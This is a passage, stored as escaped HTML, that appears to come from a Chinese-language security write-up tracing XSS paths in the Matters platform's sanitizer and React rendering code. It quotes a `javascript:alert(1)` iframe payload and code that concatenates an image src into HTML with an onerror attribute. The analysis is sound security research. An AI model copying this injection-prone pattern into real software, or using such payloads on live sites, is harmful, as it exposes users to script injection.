class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;ignoreTagProcessor&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token parameter&quot;&gt;tag&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; string&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  html&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; string&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  options&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;key&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; string&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; any &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;tag &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;input&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; tag &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;textarea&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; xssOptions &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  whiteList&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;xss&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;whiteList&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;CUSTOM_WHITE_LISTS&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  onIgnoreTagAttr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  onIgnoreTag&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; ignoreTagProcessor&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; customXSS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;xss&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;FilterXSS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;xssOptions&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;sanitize&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;string&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; string&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; customXSS&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;string&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這邊比較值得注意的是這一段：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;CUSTOM_WHITE_LISTS&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  a&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;xss&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;whiteList&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;class&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  figure&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  figcaption&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  source&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;src&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;type&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  iframe&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;src&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;frameborder&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;allowfullscreen&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;sandbox&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這一段就是允許被使用的 tag 跟屬性，而屬性的內容也會被過濾。例如說雖然允許 iframe 跟 src 屬性，但是 &lt;code&gt;&amp;lt;iframe src=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;&lt;/code&gt; 是行不通的，因為這種 &lt;code&gt;javascript:&lt;/code&gt; 開頭的 src 會被過濾掉。&lt;/p&gt;
&lt;p&gt;只看 server side 的沒有用，還需要看 client side 那邊是怎麼 render 的。&lt;/p&gt;
&lt;p&gt;對於文章的顯示是這樣的：&lt;a href=&quot;https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/views/ArticleDetail/Content/index.tsx&quot;&gt;src/views/ArticleDetail/Content/index.tsx&lt;/a&gt;）&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;br&gt;    className&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;classNames&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;u-content&#39;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; translating &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    dangerouslySetInnerHTML&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;br&gt;    onClick&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;captureClicks&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    ref&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;contentContainer&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;style jsx&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;styles&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;style&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Matters 的前端使用的是 React，在 React 裡面所 render 的東西預設都已經 escape 過了，所以基本上不會有 XSS 的洞。但有時候我們不想要它過濾，例如說文章內容，我們可能會需要一些 tag 可以 render 成 HTML，這時候就可以用 &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt;，傳入這個的東西會直接以 innerHTML 的方式 render 出來，不會被過濾。&lt;/p&gt;
&lt;p&gt;所以一般來說都會採用 js-xss + dangerouslySetInnerHTML 這樣的做法，確保 render 的內容儘管是 HTML，但不會被 XSS。&lt;/p&gt;
&lt;p&gt;這邊在傳入 dangerouslySetInnerHTML 之前先過了一個叫做 optimizeEmbed 的函式，可以繼續往下追，看到 &lt;a href=&quot;https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/text.ts#L89&quot;&gt;src/common/utils/text.ts&lt;/a&gt;：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;optimizeEmbed&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;content&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; string&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; content&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;\&amp;lt;iframe &lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-flags&quot;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&amp;lt;iframe loading=&quot;lazy&quot;&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;&amp;lt;img\s[^&gt;]*?src\s*=\s*[&#39;\&quot;]([^&#39;\&quot;]*?)[&#39;\&quot;][^&gt;]*?&gt;&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-flags&quot;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;match&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; src&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; offset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;/* html */&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&lt;br&gt;      &amp;lt;picture&gt;&lt;br&gt;        &amp;lt;source&lt;br&gt;          type=&quot;image/webp&quot;&lt;br&gt;          media=&quot;(min-width: 768px)&quot;&lt;br&gt;          srcSet=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toSizedImageURL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; url&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; src&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;1080w&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ext&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;webp&#39;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&lt;br&gt;          onerror=&quot;this.srcset=&#39;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;src&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;&quot;&lt;br&gt;        /&gt;&lt;br&gt;        &amp;lt;source&lt;br&gt;          media=&quot;(min-width: 768px)&quot;&lt;br&gt;          srcSet=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toSizedImageURL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; url&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; src&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;1080w&#39;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&lt;br&gt;          onerror=&quot;this.srcset=&#39;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;src&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;&quot;&lt;br&gt;        /&gt;&lt;br&gt;        &amp;lt;source&lt;br&gt;          type=&quot;image/webp&quot;&lt;br&gt;          srcSet=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toSizedImageURL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; url&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; src&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;540w&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ext&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;webp&#39;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&lt;br&gt;        /&gt;&lt;br&gt;        &amp;lt;img&lt;br&gt;          src=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;src&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&lt;br&gt;          srcSet=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toSizedImageURL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; url&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; src&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;540w&#39;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&lt;br&gt;          loading=&quot;lazy&quot;&lt;br&gt;        /&gt;&lt;br&gt;      &amp;lt;/picture&gt;&lt;br&gt;    &lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這邊採用 RegExp 把 img src 拿出來，然後用字串拼接的方式直接拼成 HTML，再往下看 &lt;a href=&quot;https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/url.ts#L49&quot;&gt;toSizedImageURL&lt;/a&gt;：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;toSizedImageURL&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ext &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; ToSizedImageURLProps&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; assetDomain &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; process&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;env&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;NEXT_PUBLIC_ASSET_DOMAIN&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;process&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;env&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;NEXT_PUBLIC_ASSET_DOMAIN&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; isOutsideLink &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; url&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;assetDomain&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; isGIF &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;gif&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-flags&quot;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;assetDomain &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; isOutsideLink &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; isGIF&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; url&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; key &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; url&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;assetDomain&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; extedUrl &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;changeExt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ext &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token 